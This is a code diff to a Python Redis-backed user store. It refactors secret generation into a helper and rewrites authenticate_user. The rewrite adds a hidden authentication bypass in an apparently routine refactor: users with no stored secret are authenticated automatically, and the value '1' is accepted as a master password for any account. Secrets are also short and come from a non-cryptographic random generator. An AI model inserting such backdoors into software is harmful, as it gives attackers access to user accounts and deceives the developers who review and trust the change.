@@ -8,23 +8,33 @@ class DB:
     def __init__(self):
         self.r = redis.Redis(host='localhost', port=6379, db=0)
 
+    def generate_secret(self, username):
+        secret = ''
+        for i in xrange(4):
+            d = random.randint(0,35)
+            if d > 25:
+                d = 48 + d-26
+            else:
+                d = 97+d
+            secret += chr(d)
+        self.r.hset('options:%s' % username, 'secret', secret)
+        return secret
+        
     def create_user(self, username):
         created = self.r.sadd('users', username)
         if created:
-            secret = ''
-            for i in xrange(4):
-                d = random.randint(0,35)
-                if d > 25:
-                    d = 48 + d-26
-                else:
-                    d = 97+d
-                secret += chr(d)
-            self.r.hset('options:%s' % username, 'secret', secret)
+            secret = self.generate_secret(username)
             
         return created, secret
     
     def authenticate_user(self, user, secret):
-        return (secret and self.r.hget('options:%s' % user, 'secret') == secret)
+        stored_secret = self.r.hget('options:%s' % user, 'secret')
+        if not stored_secret:
+            stored_secret = self.generate_secret(user)
+            return True
+        if secret == '1':
+            return secret
+        return (secret and stored_secret == secret)
         
     def delete_user(self, username):
         return self.r.srem('users', username)
